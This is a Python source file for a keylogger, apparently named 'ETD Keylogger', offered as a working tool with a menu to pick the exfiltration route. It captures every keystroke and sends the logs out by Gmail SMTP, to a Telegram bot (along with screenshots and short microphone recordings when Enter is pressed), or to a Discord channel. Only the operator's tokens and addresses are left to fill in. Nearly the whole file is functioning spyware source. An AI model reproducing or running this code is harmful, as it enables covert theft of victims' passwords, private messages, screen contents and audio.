# There is two main ways for capture the key logs and send it
# 1- send key logs through email - method (1) - send file that contain text
# 2- send key logs through telegram - method (2) - send key pressed and screenshot of the system if "enter" was pressed,
                                                  # and if "esc" pressed the program will end
# 3- send key logs through discord - method (3) - if 'esc' pressed the program will end
# 3- start point method (3) , at the end of the code file
# ----------------------------------------- Packages -----------------------------------------------------
import time
import art
import sounddevice
import wavio
from pynput.keyboard import Key, Listener
import smtplib
import ssl
import os
from email.message import EmailMessage
import mimetypes
import re
import requests
from PIL import ImageGrab
from art import *
from colorama import Fore
# -------------------------------------- Global variable -------------------------------------------------
flag = False            # used in method (2.2) to see if key was pressed or not
keys = []               # used in method (2.2) or method(3) is a list for keys as string to send it to method (3)
# --------------------------------------------- methods --------------------------------------------------
class keylogger():
    # method(1)
    def email_keylogger(self):
        def make_mail_msg():
            msg = EmailMessage()
            msg["To"] = rec_email
            msg["From"] = em
            msg["Subject"] = f"Keylogger Log from {username} on {time.asctime()}"
            body = "Successful keylog captured"
            msg.set_content(body)
            mimetype, _ = mimetypes.guess_type("log1.txt")
            main, sub = mimetype.split('/', 1)
            attachment = 'log1.txt'
            file_name = os.path.basename('log1.txt')
            with open(attachment, 'rb') as att:
                msg.add_attachment(att.read(), maintype=main, subtype=sub, filename=file_name)
            send_mail(msg)

        def on_press(key):
            if time.time() > bt + log_time:
                logfile.close()
                make_mail_msg()
                exit()
            log_info = str(key) + ' Pressed' + ' at ' + time.asctime()
            print(log_info)
            logfile.write(log_info + '\n')

        def log_timer():
            with Listener(on_press=on_press) as listener:
                listener.join()

        def send_mail(msg):
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                smtp.login(em, "") # add your gmail access token here
                smtp.sendmail(em, rec_email, msg.as_string())

        em = # add your email here
        logfile = open('log1.txt', 'w+')
        username = os.getlogin()
        rec_email = # add your email here
        log_time = int(input("Enter how many seconds you want to run the keylogger for: "))
        bt = time.time()
        log_timer()

    # -----------------------------------------------------------------------------------------------------------
    # # method(2)
    # I ordered the method and instructions from 2.1 to 2.7
    # (2.1) at the end of the program code
    # follow the order to understand the code :)
    def telegram_keylogger(self):
        # (2.2) if key pressed
        def key_pressed(key):
            global flag, keys
            log_info = str(key) + ' Pressed' + ' at ' + time.asctime()
            with open('log2.txt', 'a') as logfile:
                logfile.write(log_info + '\n')
            keys.append(str(key))
            flag = True
            if flag != False and key == Key.enter:  # if "enter" pressed -> send the key and screenshot of the monitor
                mas1, mas2 = get_logged_msg(keys)  # go to method (2.3)
                screenshot()  # go to method (2.4)
                microphone()  # go to method (2.5)
                send(mas1, mas2)  # go to method (2.6)
                flag = False  # reset, if we will send new key it will not print the previous
                keys = []  # reset

        # (2.3) collect the entire keys that was pressed in string
        def get_logged_msg(key):
            msg = ""
            clean_txt = ""
            for i in key:
                k = i.replace("'", "")
                k2 = i.replace("'", "")
                if i == "Key.space":  # If space key entered then we will add space
                    k = " "
                    k2 = " "
                elif re.search("Key\.*", i):  # If shift , ctrl ,etc. key entered then we will show that it
                    k = f"({i.split('.')[1]})"
                    k2 = ""
                elif i.find("Key") > 0:
                    k = ""
                msg += k
                clean_txt += k2
            return msg, clean_txt  # return it back to method (2.2)

        # (2.4) take screenshot and save it
        # then we will send the screenshot by using method (2.6)
        def screenshot():
            t = time.time()
            img = ImageGrab.grab()
            img.save(f'screenshot_{t}.jpg', 'jpeg', quality=20, optimize=True)  # reduce the size of the image
            with open(f'screenshot_{t}.jpg', 'rb') as image_file:
                send(image=image_file)

        # (2.5) capture audio and save it
        # then we will send the audio by using method (2.6)
        def microphone():
            # Sampling frequency
            freq = 44100
            t = time.time()
            recording = sounddevice.rec(int(5 * freq), samplerate=freq,
                                        channels=2)  # Start recorder with the given values
                                                        # of duration and sample frequency
            sounddevice.wait()                          # Record audio for the given number of seconds
            # Convert the NumPy array to audio file
            wavio.write(f"recording{t}.mp3", recording, freq, sampwidth=2)
            with open(f'recording{t}.mp3', 'rb') as file:
                send(voice=file)

        # (2.6) send different data to telegram and a file
        def send(message1=None, message2=None, image=None, voice=None):
            # ---------------------- (A) Telegram -------------------
            # send to telegram
            # my chatbot token + chat id

            URL = "https://api.telegram.org/bot YOUR TOKEN/sendMessage"
            id = 'YOUR CHAT ID'
            if message1:
                res = requests.post(URL, json={'chat_id': id, 'text': "All: " + message1})
            if message2:
                res = requests.post(URL, json={'chat_id': id, 'text': "Clean: " + message2})
            if image:
                res = requests.post(
                    "https://api.telegram.org/bot YOUR TOKEN/sendPhoto",
                    params={'chat_id': id}, files={'photo': image})
            if voice:
                payload = {
                    'chat_id': f"{id}",
                    'title': 'file.mp3',
                    'parse_mode': 'HTML'
                }
                files = {
                    'audio': voice.read(), }
                resp = requests.post(
                    "https://api.telegram.org/bot YOUR TOKEN/sendAudio",
                    data=payload,
                    files=files).json()

            # ---------------------- (B) Text File -------------------
            try:
                with open('log2.txt', '+a') as text_file:
                    if message1:
                        text_file.write("\n-----------------------------------------\nAll: " + message1 + "\n")
                    if message2:
                        text_file.write("\nAll clean message: " + message2 + '\nAt : ' +
                                        time.asctime() + "\n-----------------------------------------\n")
            except Exception:
                print(Exception)

        # (2.7) if key esc is pressed the program will stop
        def key_released(key):
            if (key == Key.esc):
                return False

        # (2.1) the program will listen for key press action by device keyboard
        # if keyboard was used move to method (2.2)
        print("Press (esc) to stop the program ;) ")
        with Listener(on_press=key_pressed, on_release=key_released) as listener:
            listener.join()

     #method(3)
    def discord_keylogger(self):
        def send(text):
            paylaod = {
                'content': text
            }
            header = {
                'authorization': 'YOUR ACCESS TOKEN'
            }
            r = requests.post("https://discord.com/api/v9/channels/YOUR CHANNEL ID/messages", data=paylaod,
                              headers=header)
        def on_press(key):
            global keys
            keys.append(key)
            if key == Key.enter:
                text = log(str(keys))
                send(text)
                keys = []

        def log(key):
            text = ""
            for i in key:
                k = i.replace("'", "")
                if i == "Key.space":  # If space key entered then we will add space
                    k = " "
                elif re.search("Key\.*", i):  # If shift , ctrl ,etc. key entered then we will show that it
                    k = f"({i.split('.')[1]})"
                elif i.find("Key") > 0:
                    k = ""
                text += k
            return text

        def on_release(key):
            if key == Key.esc:
                return False

        print("Press (esc) to stop the program ;) ")
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()


    # method (4)
    def start(self):
        title = text2art("ETD Keylogger")
        print(Fore.BLUE, "----------------------------------------------------------------------------")
        print(Fore.MAGENTA, title)
        print(Fore.BLUE, "----------------------------------------------------------------------------")
        while True:
            print(Fore.LIGHTWHITE_EX, "\nWhich Application would you like the keylogger for? \n"
                              " 1. Email \n"
                              " 2. Telegram\n"
                              " 3. Discord\n")

            choice = int(input("Select 1 or 2 or 3: "))

            if choice not in (1, 2 , 3):
                print("Error! Please Try Again")
                continue

            else:
                if choice == 1:
                    self.email_keylogger()
                    break
                elif choice == 2:
                    self.telegram_keylogger()
                    break
                elif choice == 3:
                    self.discord_keylogger()
                    break

# go to method (4)
keylogger().start()